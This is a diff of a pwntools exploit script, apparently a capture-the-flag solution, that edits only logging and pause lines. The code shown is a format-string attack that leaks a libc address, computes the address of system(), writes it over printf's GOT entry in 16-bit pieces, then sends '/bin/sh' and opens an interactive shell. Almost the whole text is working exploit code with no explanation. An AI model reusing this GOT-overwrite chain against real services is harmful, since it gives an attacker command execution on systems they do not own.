@@ -134,15 +134,12 @@ p.sendline(payload)
 
 p.recvuntil('leak:')
 leak = int(p.recv(14),16) 
-log.info('\tleak : '+ hex(leak))
+#log.info('\tleak : '+ hex(leak))
 
 libc_base = leak - libc.symbols['__libc_start_main']
 system = libc_base + libc.symbols['system']
 
-log.info('\tlibc base '+ hex(libc_base))
-log.info('\tprintf@got '+hex(printf_got))
-log.info('\tsystem '+hex(system))
-
+#log.info('\tlibc base '+ hex(libc_base))
 
 system_low = system & 0xffff
 system_middle = (system >> 16) & 0xffff
@@ -161,8 +158,7 @@ else:
     high = 0x10000 + system_high - system_middle
 
 
-log.info('### main ###')
-log.info('[3] input : printf@got -> system')
+#log.info('[3] input : printf@got -> system')
 
 
 p.recvuntil(b"\n\n")
@@ -178,11 +174,10 @@ payload += p64(printf_got + 2)
 payload += p64(printf_got + 4)
 
 
-pause()
+#pause()
 p.send(payload)
 
-log.info('### main ###')
-log.info('[4] input : /bin/sh\x00')
+#pause()
 p.send(b'/bin/sh\x00')
 
 p.interactive()
